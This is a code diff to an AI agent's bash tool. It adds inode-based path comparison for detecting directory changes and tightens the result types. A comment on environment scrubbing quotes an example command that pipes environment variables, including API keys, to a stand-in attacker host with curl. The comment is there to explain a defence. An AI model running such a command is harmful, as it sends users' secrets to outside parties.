@@ -1,6 +1,7 @@
 import { spawn } from 'child_process';
 import { randomBytes } from 'crypto';
-import type { ToolContext, ToolDefinition, ToolHandler, ToolResult } from './types.js';
+import { statSync } from 'fs';
+import type { BashToolHandler, BashToolResult, ToolContext, ToolDefinition } from './types.js';
 import { TOOL_NAMES } from './types.js';
 import { sanitizeEnv } from '../security/env.js';
 
@@ -8,6 +9,35 @@ import { sanitizeEnv } from '../security/env.js';
 // is appended so a user command echoing the literal prefix cannot be confused
 // with the wrapper's marker.
 const CWD_SENTINEL_PREFIX = '__FACTORY_CWD_AFTER__';
+
+/** True when two paths resolve to the same filesystem location.
+ *
+ *  Compares device + inode numbers via `fs.statSync` rather than string
+ *  equality. Two cases that surfaced before this lift:
+ *
+ *  - macOS case-insensitive APFS: `process.cwd()` returns the lowercase
+ *    form (`/Users/vilaca/...`) inherited from a launching shell while
+ *    the spawned bash's `$PWD` ends up capitalized (`/Users/Vilaca/...`)
+ *    via the user's home directory record. `realpathSync` preserves
+ *    whatever case the caller passes in, so it isn't enough — but
+ *    stat'ing both paths returns the same inode.
+ *  - Symlinks: `cwd = '/var/foo'`, sentinel = `'/private/var/foo'`. Same
+ *    inode; we don't want to surface a phantom `cwdAfter`.
+ *
+ *  Falls back to literal string equality when either stat throws (the
+ *  directory was deleted between cwd capture and comparison, or some
+ *  other rare I/O error). The fallback preserves the previous behaviour
+ *  for the edge case rather than swallowing a real cd. */
+function samePath(a: string, b: string): boolean {
+  if (a === b) return true;
+  try {
+    const sa = statSync(a);
+    const sb = statSync(b);
+    return sa.dev === sb.dev && sa.ino === sb.ino;
+  } catch {
+    return false;
+  }
+}
 
 // Default per-call wall-clock cap. Long enough for most builds/tests but
 // short enough that a runaway command can't hold the agent loop hostage.
@@ -81,7 +111,7 @@ const definition: ToolDefinition = {
   },
 };
 
-async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promise<ToolResult> {
+async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promise<BashToolResult> {
   const command = typeof args.command === 'string' ? args.command : '';
   const timeout = clampTimeout(args.timeout);
   const cwd = ctx?.cwd ?? process.cwd();
@@ -106,6 +136,9 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
   // Env scrubbing (deny-by-default; see src/security/env.ts). Cuts the
   // exfiltration surface to ~15 named vars + a few prefixes — model can
   // no longer `printenv | curl -d @- evil.com` provider API keys.
+  // `env` is typed `SanitizedEnv` (a branded subtype of `ProcessEnv`);
+  // the brand is what tells a reader that this spawn cannot receive raw
+  // `process.env` without an explicit `as SanitizedEnv` cast somewhere.
   const { env } = sanitizeEnv(process.env, ctx?.envPolicy);
 
   return new Promise(resolve => {
@@ -121,7 +154,7 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
     let stdout = '';
     let stderr = '';
     let settled = false;
-    const settle = (r: ToolResult): void => {
+    const settle = (r: BashToolResult): void => {
       if (settled) return;
       settled = true;
       resolve(r);
@@ -187,7 +220,7 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
       // run-tool-calls.ts enforces that contract — see the for-of in
       // runToolCalls. If that ever parallelizes, cwdAfter semantics need
       // rethinking (last-writer-wins isn't well-defined under parallelism).
-      const dirChanged = cwdAfter !== undefined && cwdAfter !== cwd;
+      const dirChanged = cwdAfter !== undefined && !samePath(cwdAfter, cwd);
       settle({
         success: true,
         output,
@@ -271,7 +304,8 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
 //     isn't running, rather than silently falling through to a less
 //     restricted backend.
 
-export const bashTool: ToolHandler = {
+export const bashTool: BashToolHandler = {
+  kind: 'bash',
   name: TOOL_NAMES.Bash,
   description: definition.function.description,
   category: 'execute',
